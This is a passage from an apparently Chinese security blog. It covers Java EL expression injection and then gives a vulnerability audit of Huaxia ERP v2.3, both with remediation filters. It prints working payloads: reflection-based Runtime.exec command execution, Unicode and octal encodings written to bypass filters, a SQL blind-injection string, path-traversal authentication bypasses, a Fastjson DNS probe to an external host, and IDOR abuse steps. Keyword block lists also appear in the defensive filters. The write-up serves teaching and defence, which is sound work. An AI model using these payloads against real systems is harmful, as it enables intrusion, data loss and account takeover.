align=\"center\">\n&lt;p>$&#123;param[\"username\"]&#125;&lt;/p>\n&lt;/div>\n&lt;/body>\n&lt;/html>\n\nparam 对象返回单一的字符串，而 paramValues 对象则返回一个字符串数组。\n\n\nheader 和 headerValues 对象header 和 headerValues 对象用来访问信息头，通过使用 request.getHeader() 方法和 request.getHeaders() 方法。\n举例来说，要访问一个名为 user-agent 的信息头，可以这样使用表达式：$&#123;header.user-agent&#125;，或者 $&#123;header[&quot;user-agent&quot;]&#125;\n接下来的例子表明了如何访问 user-agent 信息头：\n&lt;p>$&#123;header[\"user-agent\"]&#125;&lt;/p>\n\n输出如图\n\n\nEL中的函数EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下：\n$&#123;ns:func(param1, param2, ...)&#125;\n\nns 指的是命名空间（namespace），func 指的是函数的名称，param1 指的是第一个参数，param2 指的是第二个参数，以此类推。比如，有函数 fn:length，在 JSTL 库中定义，可以像下面这样来获取一个字符串的长度：\n$&#123;fn:length(\"Get my length\")&#125;\n\n要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用 &lt;taglib&gt; 标签在 JSP 文件中包含这些库。\nEL表达式调用Java方法看个例子即可。\n先新建一个 ELFunc 类，其中定义的 doSomething() 方法用于给输入的参数字符拼接 &quot;.com&quot; 形成域名返回：\npackage eltest;\n\npublic class ELFunc &#123;\n    public static String doSomething(String str)&#123;\n        return str + \".com\";\n    &#125;\n&#125;\n\n接着在 WEB-INF 文件夹下（除 lib 和 classess 目录外）新建 test.tld 文件，其中指定执行的 Java 方法及其 URI 地址：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;taglib version=\"2.0\" xmlns=\"http://java.sun.com/xml/ns/j2ee\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\">  \n    &lt;tlib-version>1.0&lt;/tlib-version>  \n    &lt;short-name>ELFunc&lt;/short-name>  \n    &lt;uri>http://localhost/ELFunc&lt;/uri>  \n    &lt;function>  \n        &lt;name>doSomething&lt;/name>  \n        &lt;function-class>com.drunkbaby.basicjsp.web.ELFunc&lt;/function-class>  \n        &lt;function-signature> java.lang.String doSomething(java.lang.String)&lt;/function-signature>  \n    &lt;/function>  \n&lt;/taglib>\n\nJSP 文件中，先头部导入 taglib 标签库，URI 为 test.tld 中设置的 URI 地址，prefix 为 test.tld 中设置的 short-name，然后直接在 EL 表达式中使用 类名:方法名() 的形式来调用该类方法即可：\n&lt;%@taglib uri=\"http://localhost/ELFunc\" prefix=\"ELFunc\"%>  \n$&#123;ELFunc:doSomething(\"Drunkbaby\")&#125;\n\n\n\n0x04 JSP 中启动&#x2F;禁用EL表达式全局禁用EL表达式web.xml 中进入如下配置：\n&lt;jsp-config>\n    &lt;jsp-property-group>\n        &lt;url-pattern>*.jsp&lt;/url-pattern>\n        &lt;el-ignored>true&lt;/el-ignored>\n    &lt;/jsp-property-group>\n&lt;/jsp-config>\n\n单个文件禁用EL表达式在JSP文件中可以有如下定义：\n&lt;%@ page isELIgnored=\"true\" %>\n\n该语句表示是否禁用EL表达式，TRUE 表示禁止，FALSE 表示不禁止。\nJSP2.0 中默认的启用EL表达式。\n例如如下的 JSP 代码禁用EL表达式：\n&lt;%@ page isELIgnored=\"true\" %>\n$&#123;pageContext.request.queryString&#125;\n\n\n\n0x05 EL表达式注入漏洞EL表达式注入漏洞和 SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。\n一般的，EL表达式注入漏洞的外部可控点入口都是在 Java 程序代码中，即 Java 程序中的EL表达式内容全部或部分是从外部获取的。\n通用 PoC//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）\n$&#123;pageContext&#125;\n\n//获取Web路径\n$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")&#125;\n\n//文件头参数\n$&#123;header&#125;\n\n//获取webRoot\n$&#123;applicationScope&#125;\n\n//执行命令\n$&#123;pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())&#125;\n\n简单漏洞场景比如这里有一个参数 a 是可控的，并且可以直接插入到 JSP 代码中，这种场景是非常常见的。\n举个简单的例子，如果登录界面，username 可控，并且判断不严格的情况下，就可以造成这种攻击。\n我们在 Java 程序中可以控制输入 EL表达式如下：\n$&#123;pageContext.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"calc.exe\"))&#125;\n\n\n\n但是在实际场景中，是几乎没有也无法直接从外部控制 JSP 页面中的 EL表达式的。而目前已知的 EL表达式注入漏洞都是框架层面服务端执行的 EL表达式外部可控导致的。\n个人认为，thymeleaf 的一些 CVE 就非常有代表性，这个在后续的文章会提到。\n简单漏洞场景之 CVE-2011-2730参考链接：Spring框架标签EL表达式执行漏洞分析（CVE-2011-2730）\n命令执行PoC如下：\n&lt;spring:message text=\"$&#123;/\"/\".getClass().forName(/\"java.lang.Runtime/\").getMethod(/\"getRuntime/\",null).invoke(null,null).exec(/\"calc/\",null).toString()&#125;\">&lt;/spring:message>\n\n正常情况下为：\n&lt;%@ taglib uri=\"http://www.springframework.org/tags\" prefix=\"spring\"%>\n&lt;spring:message  text=\"$&#123;param.a&#125;\">&lt;/spring:message>\n\n这里使用 message 标签，text 属性用 el表达式从请求参数中取值，这样当访问\nhttp:&#x2F;&#x2F;localhost&#x2F;test.jsp?a&#x3D;$&#123;applicationScope&#125;\n\n$&#123;applicationScope&#125; 这段字符串会被当做 el表达式被执行，而不是作为字符串直接显示在页面上，我们改变提交的 el表达式，就可以获取我们需要的信息了，这就达到了 el表达式注入的效果。\nWooyun案例参考Wooyun镜像上的案例：\n搜狗某系统存在远程EL表达式注入漏洞(命令执行)\n工商银行某系统存在远程EL表达式注入漏洞(命令执行)\nJUEL示例下面我们直接看下在 Java 代码中 EL表达式注入的场景是怎么样的。\nEL 曾经是 JSTL 的一部分。然后，EL 进入了 JSP 2.0 标准。现在，尽管是 JSP 2.1 的一部分，但 EL API 已被分离到包  javax.el 中， 并且已删除了对核心 JSP 类的所有依赖关系。换句话说：EL 已准备好在非 JSP 应用程序中使用！\n也就是说，现在 EL 表达式所依赖的包 javax.el 等都在 JUEL 相关的 jar 包中。\nJUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。\n更多参考官网：http://juel.sourceforge.net/\n需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。\n我们来写一个简单利用反射调用 Runtime 类方法实现命令执行的代码\njuelExec.java\npackage drunkbaby.basicelvul;  \n  \nimport de.odysseus.el.ExpressionFactoryImpl;  \nimport de.odysseus.el.util.SimpleContext;  \n  \nimport javax.el.ExpressionFactory;  \nimport javax.el.ValueExpression;  \n  \npublic class juelExec &#123;  \n    public static void main(String[] args) &#123;  \n        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();  \n        SimpleContext simpleContext = new SimpleContext();  \n        // failed  \n // String exp = \"$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;\"; // ok String exp = \"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;\";  \n        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);  \n        System.out.println(valueExpression.getValue(simpleContext));  \n    &#125;  \n&#125;\n\n\n\n0x06 EL 表达式的 EXP 与基础绕过基础 EXP\"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;\"\n\n利用 ScriptEngine 调用 JS 引擎绕过同 SpEL 注入中讲到的\nScriptEngineExec.java\npackage drunkbaby.basicelvul;  \n  \nimport de.odysseus.el.ExpressionFactoryImpl;  \nimport de.odysseus.el.util.SimpleContext;  \n  \nimport javax.el.ExpressionFactory;  \nimport javax.el.ValueExpression;  \n  \npublic class ScriptEngineExec &#123;  \n    public static void main(String[] args) &#123;  \n        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();  \n        SimpleContext simpleContext = new SimpleContext();  \n        // failed  \n // String exp = \"$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;\"; // ok String exp = \"$&#123;''.getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"java.lang.Runtime.getRuntime().exec('Calc.exe')\\\")&#125;\\n\" +  \n                \" \";  \n        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);  \n        System.out.println(valueExpression.getValue(simpleContext));  \n    &#125;  \n&#125;\n\n利用 Unicode 编码绕过对可利用的 PoC 进行全部或部分的 Unicode 编码都是 OK 的：\n&#x2F;&#x2F; Unicode编码内容为前面反射调用的PoC\n\\u0024\\u007b\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0027\\u0065\\u0078\\u0065\\u0063\\u0027\\u002c\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0027\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u006e\\u0075\\u006c\\u006c\\u0029\\u002c\\u0027\\u0063\\u0061\\u006c\\u0063\\u002e\\u0065\\u0078\\u0065\\u0027\\u0029\\u007d\n利用八进制编码绕过&#x2F;&#x2F; 八进制编码内容为前面反射调用的PoC\n\\44\\173\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\56\\146\\157\\162\\116\\141\\155\\145\\50\\47\\152\\141\\166\\141\\56\\154\\141\\156\\147\\56\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\147\\145\\164\\115\\145\\164\\150\\157\\144\\50\\47\\145\\170\\145\\143\\47\\54\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\51\\56\\151\\156\\166\\157\\153\\145\\50\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\56\\146\\157\\162\\116\\141\\155\\145\\50\\47\\152\\141\\166\\141\\56\\154\\141\\156\\147\\56\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\147\\145\\164\\115\\145\\164\\150\\157\\144\\50\\47\\147\\145\\164\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\151\\156\\166\\157\\153\\145\\50\\156\\165\\154\\154\\51\\54\\47\\143\\141\\154\\143\\56\\145\\170\\145\\47\\51\\175\n\n\nJohnFord 师傅的脚本\nstr = \"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;\"\nresult = \"\"\nfor s in str:\n  num = \"\\\\\" + oct(ord(s))\n  result += num\nprint(result.replace(\"\\\\0\", \"\\\\\"))\n\n0x07 防御方法\n尽量不使用外部输入的内容作为 EL 表达式内容；\n若使用，则严格过滤EL表达式注入漏洞的 payload 关键字；\n如果是排查 Java 程序中 JUEL 相关代码，则搜索如下关键类方法：\n\njavax.el.ExpressionFactory.createValueExpression()\njavax.el.ValueExpression.getValue()\n\n0x08 参考资料EL表达式注入\n","categories":["Java"],"tags":["Java"]},{"title":"Java 代码审计之华夏 ERP CMS v2.3","url":"/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/","content":"Java 代码审计之华夏 ERP CMS v2.3\n\nJava 代码审计之华夏 ERP CMS v2.3项目地址: Release 华夏ERP_v2.3\n0x01 前言\n这个 CMS 被用于了蓝帽杯的比赛当中，是让我们进行修洞了，当时因为自己环境的一些问题没有把这道题目修好，感觉到非常遗憾。\n\n趁着自己最近学了一会儿的代码审计，想尝试自己审计一遍。\n0x02 环境简单搭即可，导 sql，修改端口为 8081，方便测试。\n0x03 代码审计1. 审计准备我个人的习惯是先看一看 pom.xml，再看一些 Filter\npom.xml\n\n这里有个 fastjson 1.2.55 的洞，或许可以进行反序列化的攻击，不确定，cy 一下。\n还有一个 log4j2 的漏洞，我们后续会提到\n其他组件基本就没啥了，我们去看 Filter\nFilter 审计\n\n使用 @WebInitParam 注解配置多个 name，对 .css#.js#.jpg#.png#.gif#.ico，/user/login#/user/registerUser#/v2/api-docs资源请求的时候不会进行拦截。\n再来看具体的 Filter 做了什么工作，关于 Filter：Java内存马系列-01-基础内容学习)\n\n我们需要去到 doFilter() 方法中去看\n\n\n\n这个 doFilter() 方法，先是做了一个很基础的拦截器，代码如下\nHttpServletRequest servletRequest = (HttpServletRequest) request;  \nHttpServletResponse servletResponse = (HttpServletResponse) response;  \nString requestUrl = servletRequest.getRequestURI();  \n//具体，比如：处理若用户未登录，则跳转到登录页  \nObject userInfo = servletRequest.getSession().getAttribute(\"user\");\n\n这里有几种情况是不阻止的：register.html，login.html，以及 doc.html；因为如果这几个网站被 ban，业务都跑不了了。\n继续往下看，其中定义了一个 verify() 方法，这是拿来自己添加不被拦截的网页的，可能是当时开发者想要测试功能性，所以就多了这么一个 verify() 方法。\n\n\n这里也和上面的 @WebInitParam 注解对应起来了，当我们不处于登录的状态下，也可以直接访问 .css，.js 这些文件，测试如图。\n\n\n再往下看，是关于 allowUrls  的一个判断，简单来说 allowUrls 就是加白，这也和我们上面讲的 @WebInitParam 注解对上了，如图\n\n\n\n现在我们把 Filter 全部都解读完了，做个小结，并且思考\n\n关于审计完 Filter 后的思考小总结\n1、加了白，对应的资源加白在 ignoredUrl 中，以 # 分割，看似没什么问题；还有对应的 Path 加白，加了 /user/login，/user/registerUser 以及 /v2/api-docs\n2、没有进行 XSS 的转义过滤和 SQL 注入的恶意字符过滤，一般来说，以 RuoYi 的项目为例：都会存在一个专门过滤的 Filter，但是这里面没有，或许会埋下部分伏笔。\n思索\n对于加白的思索：是否会存在潜在的未授权访问？对于资源加白 ———— ignoredList 的判断只是进行了正则的判断，这并不符合开发的安全性，正确的写法应该使用 endsWith() 来判断 URL 是否以 .css；.js 等资源后缀结尾\n对于 URL 加白的思考：使用 startsWith() 方法来判断 URL 是否是白名单开头的时候，可以使用目录穿越来骗过判断，导致可以绕过认证请求。这种方式比较神奇，后续会打断点调试看看。\n审计准备小结先看 pom.xml，再看 Filter。\n这里总结出来，单看 Filter 就看出来几个隐藏的漏洞了：比如可能存在的 SQL 注入，比如可能存在的 XSS；还有一些越权的漏洞\n2. SQL 注入\n关于 SQL 注入在 Java 当中的代码审计可以看我这篇文章：Java OWASP 中的 SQL 注入代码审计\n\n根据 pom.xml 我们可以知道这是个 mybatis，所以对于 mybatis 的 SQL 注入，我们可以直接在 mapper_xml 文件夹内进行全局搜索 $ 以及 like，in 以及 order by。\n当然，前提是有问题的 SQL 语句当中，输入是可控的。\n我们在 mapper_xml 文件夹下全局搜索 like 关键字\n\n\n出师及其顺利！（后面发现并不是）\n失败的 SQL 注入我们先点进去看看，大致分析如图\n\n\n实际开发当中，对应 AccountMapperEx.xml 的一般都是定义在 AccountMapperEx 接口中（如果封装的好的话\n\n\n对应的 controller 文件应该是 AccoutController。对应的 service 文件是 AccoutService，这里一步步逆推，根据反序列化的链子的思维似乎是要出点问题。\n问题在于，最后总是会指向一个 ResourceController，有师傅的文章说可以一直找，我个人认为这种是错误的。\n根据 MVC 架构思维，我们先看 Service 层，定位如图\n\n\n但是到这个地方就断掉了，说明其实这里，name 并不是可控的，算是一个小失败。\n\n总结一下这次的 SQL 注入失败原因，输入并非可控。\n\n成功的 SQL 注入这里我们就直接去找 UserMapperEx.xml，因为这个业务点我认为是非常非常直接的，显山露水的，找可控点更为容易。在 UserMapperEx.xml 里面搜索 like 这一关键字\n\n\n对应的，我们去到接口：UserMapperEx.java\n\n\n对应的 Service 接口与 Controller 接口如图\n\n\n\n\n那么试想一下运用到这个 SQL 语句的场景该是什么？很明显在 /addUser 这个情况下是可以触发的。\n我这里访问了 /user/list 页面，抓包后看到了 search 后跟着一堆参数，这堆参数进行 URL 解码后是 userName 与 loginName 的值。\n\n\n看到这里我立马明白了，其实 countsByUser() 这个有问题的 SQL 语句并不是说只有后端处理 /addUser 接口的时候才会用到，而是只要我以 userName 和 loginName 作为参数进行搜索就会用到。\n我们的 payload 如下\n&#123;&quot;userName&quot;:&quot;&quot;,&quot;loginName&quot;:&quot;&#39; AND SLEEP(5)-- jsh&quot;&#125;\n\n一个简单的盲注，成功！同时我们在控制台可以看到有如图的 SQL 语句\n\n\n在 Burpsuite 中亦测试成功\n\n\n\n相类似的 SQL 注入在这个项目里面还有很多很多，师傅们在学习的时候可以尝试自己挖掘并测试。\n\nSQL 注入的修复详见这篇文章 Java OWASP 中的 SQL 注入代码审计\n如果对于应急处理，比如很多 AWD Plus 的情况下，建议是写一个 FIiter 来防御，代码如下\nimport org.springframework.stereotype.Component;\n\nimport javax.servlet.*;\nimport javax.servlet.annotation.WebFilter;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.Enumeration;\n\n\n/**\n @ author: Drunkbaby\n @ usages: 用于 SQL 注入的自定义防护\n 需要加入相应的 Servlet 环境，因为我这里是纯代码，就不打环境了\n @ 过滤 url：在 WebFilter 当中添加 urlPatterns\n */\n\n@Component\n@WebFilter(urlPatterns = \"/system/role/list\", filterName = \"sqlInjectFilter\")\npublic class sqlFilter implements Filter &#123;\n    public void destroy() &#123;\n    &#125;\n\n    public void init(FilterConfig arg0) throws ServletException &#123;\n    &#125;\n\n    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;\n        HttpServletRequest request = (HttpServletRequest) req;\n        HttpServletResponse response = (HttpServletResponse) res;\n        // 获得所有请求参数名\n        Enumeration params = request.getParameterNames();\n        String sql = \"\";\n        while (params.hasMoreElements()) &#123;\n            // 得到参数名\n            String name = params.nextElement().toString();\n            // 得到参数对应值\n            String[] value = request.getParameterValues(name);\n            for (int i = 0; i &lt; value.length; i++) &#123;\n                sql = sql + value[i];\n            &#125;\n        &#125;\n        if (sqlValidate(sql)) &#123;\n            throw new IOException(\"您发送请求中的参数中含有非法字符\");\n        &#125; else &#123;\n            chain.doFilter(request, response);\n        &#125;\n    &#125;\n\n    /**\n     * 参数校验\n     * @param str\n     */\n    public static boolean sqlValidate(String str) &#123;\n        str = str.toLowerCase();//统一转为小写\n        String badStr = \"select|update|and|or|delete|insert|truncate|char|into|substr|ascii|declare|exec|count|master|into|drop|execute|table\";\n        String[] badStrs = badStr.split(\"\\\\|\");\n        for (int i = 0; i &lt; badStrs.length; i++) &#123;\n            //循环检测，判断在请求参数当中是否包含SQL关键字\n            if (str.indexOf(badStrs[i]) >= 0) &#123;\n                return true;\n            &#125;\n        &#125;\n        return false;\n    &#125;\n&#125;\n\n我们可以自定义过滤的恶意字符，比如 --+；&#39; 这些非业务需要的字符。\n3. 两个白名单的越权（权限校验绕过）\n看完了 SQL 注入，看一下关于前文提到的白名单越权的\n\n正常业务 URL 加白资源加白的问题在前面已经说过了，我们现在直接来复现一遍\n当我们没有处于登录态的时候，发包&#x2F;访问时得到的是一个 302 的重定向回显，如图\n\n\n前文说到，这几种请求是不会被拦截的：/doc.html，/register.html，/login.html\n所以我们构造如下 payload\n&#x2F;login.html&#x2F;..&#x2F;home.html\n\n\n\n成功 Bypass\n资源加白同上面是一样的，因为没有做严格的 endsWith() 的判断\npayload 如下\n&#x2F;1.css&#x2F;..&#x2F;home.html\n\n\n\nURL 加白同样的攻击手段\n&#x2F;user&#x2F;login&#x2F;..&#x2F;..&#x2F;home.html\n\n这个攻击不如前两种好用，它要求你知道文件的路径\n\n\n漏洞修复最简单的应急方法应该是过滤 ../ ，也就是寻常的目录遍历防御手段一直，这种防御可以直接加在 Filter 里面，代码如下\npackage PathTravelFilter;\n\nimport java.util.regex.Pattern;\n\n/**\n @ author: Drunkbaby\n @ usages: 用于目录遍历的单个字符防御\n */\n\npublic class PathFilter &#123;\n\n    //private static Pattern FilePattern = Pattern.compile(\"[\\\\\\\\/:*?\\\"&lt;>|]\");\n\n    private static Pattern FilePattern = Pattern.compile(\"[\\\\s\\\\.:?&lt;>|]\"); //过滤规则\n\n    public static String filenameFilter(String str) &#123;\n        return str==null?null:FilePattern.matcher(str).replaceAll(\"\");\n    &#125;\n\n    public static void main(String[] args) &#123;\n        String str=\"home/..  &lt;>|logs/../:edata?\";\n        //String filenameFilter = filenameFilter(str);\n        String filenameFilter = fileNameValidate(str);\n        System.out.println(filenameFilter);\n    &#125;\n\n    private static String fileNameValidate(String str) &#123;\n\n        String strInjectListStr =\"../|./|/..| |&lt;|>|:|?\";\n        if(null!=strInjectListStr &amp;&amp; !\"\".equals(strInjectListStr))\n        &#123;\n            str = str.toLowerCase();\n            String[] badStrs = strInjectListStr.split(\"\\\\|\");\n            for (int i = 0; i &lt; badStrs.length; i++) &#123;\n                if (str.indexOf(badStrs[i]) >= 0) &#123;\n                    str= str.replace(badStrs[i], \"\");\n                &#125;\n            &#125;\n        &#125;\n        return str;\n    &#125;\n&#125;\n\n4. 存储型 XSS在之前审计 Filter 的时候并未发现针对 XSS 进行了些许过滤\nXSS 本质上是把我们输入的东西拼接到 HTML 语句里面去，这一块我们先随意选取一个界面\nhttp:&#x2F;&#x2F;127.0.0.1:8081&#x2F;index.html#&#x2F;pages&#x2F;financial&#x2F;item_in.html\n\n在备注当中插入即可，今年蓝帽杯决赛的时候也是出了这个题目，这道题目名叫《赌怪》，我个人对于这道题目的理解就是，这是一个洞很多的 CMS，最好就全修了，但是当时上 Filter 防御失败了。\n\n\n每一次访问的时候都会造成 XSS\n\n\n在很多界面都存在这个问题，比如说用户管理这里，添加用户，也会造成存储型 XSS\n\n\n\n\n漏洞修复直接添加 Filter 的方式会比较直接\n\nimport javax.servlet.*;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletRequestWrapper;\nimport java.io.IOException;\nimport java.util.List;\n\n/**\n @ author: Drunkbaby\n @ usages: 用于 XSS 的自定义防护\n */\npublic class XSSFilter implements Filter &#123;\n\n    FilterConfig filterConfig = null;\n    private List urlExclusion = null;\n    public void init(FilterConfig filterConfig) throws ServletException &#123;\n        this.filterConfig = filterConfig;\n    &#125;\n\n    public void destroy() &#123;\n        this.filterConfig = null;\n    &#125;\n\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException, IOException &#123;\n        HttpServletRequest httpServletRequest = (HttpServletRequest) request;\n        String servletPath = httpServletRequest.getServletPath();\n        if (urlExclusion != null &amp;&amp; urlExclusion.contains(servletPath)) &#123;\n            chain.doFilter(request, response);\n        &#125; else &#123;\n            chain.doFilter((ServletRequest) new XssHttpServletRequestWrapper((HttpServletRequest) request), response);\n        &#125;\n    &#125;\n\n    public List getUrlExclusion() &#123;\n        return urlExclusion;\n    &#125;\n\n    public void setUrlExclusion(List urlExclusion) &#123;\n        this.urlExclusion = urlExclusion;\n    &#125;\n&#125;\n\nclass XssHttpServletRequestWrapper extends HttpServletRequestWrapper &#123;\n    public XssHttpServletRequestWrapper(HttpServletRequest servletRequest) &#123;\n        super(servletRequest);\n    &#125;\n\n    public String[] getParameterValues(String parameter) &#123;\n        String[] values = super.getParameterValues(parameter);\n        if (values == null) &#123;\n            return null;\n        &#125;\n\n        int count = values.length;\n        String[] encodedValues = new String[count];\n        for (int i = 0; i &lt; count; i++) &#123;\n            encodedValues[i] = cleanXSS(values[i]);\n        &#125;\n        return encodedValues;\n    &#125;\n\n    public String getParameter(String parameter) &#123;\n        String value = super.getParameter(parameter);\n        if (value == null) &#123;\n            return null;\n        &#125;\n        return cleanXSS(value);\n    &#125;\n\n    public String getHeader(String name) &#123;\n        String value = super.getHeader(name);\n        if (value == null)\n            return null;\n        return cleanXSS(value);\n    &#125;\n\n    private String cleanXSS(String value) &#123;\n//You'll need to remove the spaces from the html entities below\n        value = value.replaceAll(\"\\\\(\", \"&amp; #40;\").replaceAll(\"\\\\)\", \"&amp; #41;\");\n        value = value.replaceAll(\"'\", \"&amp; #39;\");\n        value = value.replaceAll(\"eval\\\\((.*)\\\\)\", \"\");\n        value = value.replaceAll(\"[\\\\\\\"\\\\\\'][\\\\s]*javascript:(.*)[\\\\\\\"\\\\\\']\", \"\\\"\\\"\");\n        value = value.replaceAll(\"script\", \"\");\n        return value;\n    &#125;\n&#125;\n\n通过转义恶意字符的方式进行修复，但是我个人认为这里这么修不算是一种好的修法，算是俗修。\n真正修法应该是写一个 Utils 的工具类，把一些输入进行处理，并且因为这里不存在反射型 XSS，还有一种修法，可以把这些要存入数据库的数据进行过滤。这个在实际开发里面用的比较多。\n5. Fastjson 反序列化 RCE因为在项目中 Fastjson 版本是 1.2.55，存在 RCE 的漏洞，这里反序列化的地方很多，我们要去找的地方一定是要输入可控的。\n这里我思考了一下，应该直接去找关于 search 的，也就是和上面 SQL 注入的一样，全局搜索 parseObject，找到了 StringUtil 这个工具类\n\n\n它的 getInfo() 方法中，是存在一个 parseObject() 反序列化的语句，我们接下来去找谁调用了 StringUtil.getInfo()\n\n\n\n这一个 UserComponent.getUserList() 其实和我们之前在 SQL 注入漏洞里面看到的是一样的，所以对于攻击来说，我们依旧可以把它作为攻击的入口。\n\n构造一个 URLDns 的请求，payload 如下\nsearch&#x3D;&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xtuit14cnmcrndt2043mwlxoafg74w.oastify.com&quot;&#125;\n\n发包如图\n\n\n收到了 DNS 请求\n\n\n\n证明存在 Fastjson 漏洞，然后我们进一步构造 payload，进行弹 shell 实践。\n\n这里对 jdk 版本是要低一些，并且要先开启 AutoTypeSupport\n\n\n师傅们可以现在本地进行测试。\n先开启恶意 .class 和 Ldap\n\n\n弹计算器成功\n\n\n漏洞修复\n我个人认为这里并不算漏洞，因为并未开启 checkAutoType\n\n6. 越权漏洞越权密码重置对应这里，先去看它的接口\n\n\n发现这个业务逻辑的代码是写在 Service 层里面的，跟进一下 Service 层的代码\n\n\n这里只是简单判断了 &quot;admin&quot;.equals(loginName)，从开发的角度上来说，我个人这里可能更偏向于使用 JWT，或者说加一个 Admin 的白名单，诸如此类的设计思维。\n在判断完 &quot;admin&quot;.equals(loginName) 之后，如果不是 admin，这里就直接进行 user.setPassword() 了，并未将 ID 与 loginName 一一对应。\n漏洞操作如图，先进行密码重置\n\n\n接着，修改 userId 为其他用户的，这里可以进行批量发包，会导致所有普通用户的密码全部被修改\n\n\n\n这里的这个漏洞，可以和之前我们说的未授权漏洞结合起来。\n\n越权删除用户\n先去看 deleteUser 对应的接口\n\n\n\n同样，去看 Service 层的业务代码\n\n\n这里其实这么写是也有道理的，我们可以发现普通用户是没有管理用户这个界面的，所以对于代码来说，也是情有可原。\n但是问题就出在 doc.html 中，这个接口文档在被未授权读取之后，能够看到所有的 URL，配合之前的未授权可以进行删库的操作，但是可利用性并不大。\n我们先用 admin 的账户抓一个 deleteUser 的包\n\n\n再用我们普通用户权限去抓包，替换 Session，替换 ID，成功删除 admin 的账户。这里的水平越权与垂直越权都是存在的。\n\n\n再登录，就是用户不存在了\n\n\n越权修改用户信息对应的接口是 updateUser\n\n\n去到 Service 层，这里有一个 checkUserNameAndLoginName(ue); 的语句，跟进去看一下\n\n\ncheckUserNameAndLoginName() 做了一个什么业务呢，它进行 UserName 与 loignName 是否为空的判断\n我们先看 loginName 是否为空的判断\n\n\n再看 userName\n\n\n\n乍一看代码好像没啥问题，这里最大的问题是没有把 loginName 或是 UserName 与 ID 进行一个匹配。\n\n我之前在学开发的时候也被人这么说过，大致意思就是 “这种操作你怎么会不进行一个 ID 与 userName 的判断的啊？亏你还是学安全的”；\n具体的复现就先不复现了，我们重点关注越权漏洞的修复\n漏洞修复实现方式也很简单，在 Mapper 的 SQL 语句中加上 selectIdByUserName  就可以了，这样的话我们只需要进行如下判断\nLong userId=userEx.getId();\nString loginName=userEx.getLoginName();\n\nif 